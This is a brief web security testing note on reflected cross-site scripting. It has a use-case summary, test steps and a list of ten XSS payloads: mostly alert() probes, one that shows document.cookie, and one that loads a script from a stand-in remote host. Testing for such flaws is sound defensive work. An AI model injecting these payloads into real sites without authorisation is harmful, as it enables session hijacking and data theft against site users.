## Use case

The application allows user input to be reflected in the response without proper sanitization, enabling an attacker to execute arbitrary JavaScript code in the context of the victim's browser. This could lead to session hijacking, data theft, or other malicious actions.

## Steps to test

1. Identify input fields or parameters that reflect user input in the response.
2. Inject a basic XSS payload such as <script>alert('XSS')</script> into the input field.
3. Submit the form or request to trigger the response.
4. Observe if the payload executes in the browser, indicating a successful XSS vulnerability.

## Commands

```text
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
<div onclick="alert('XSS')">Click me</div>
<body onload=alert('XSS')>
<script src="<http://example.com/xss.js>"></script>
<svg/onload=alert('XSS')>
<style>@import 'javascript:alert("XSS")';</style>
<iframe src="javascript:alert('XSS')"></iframe>
```
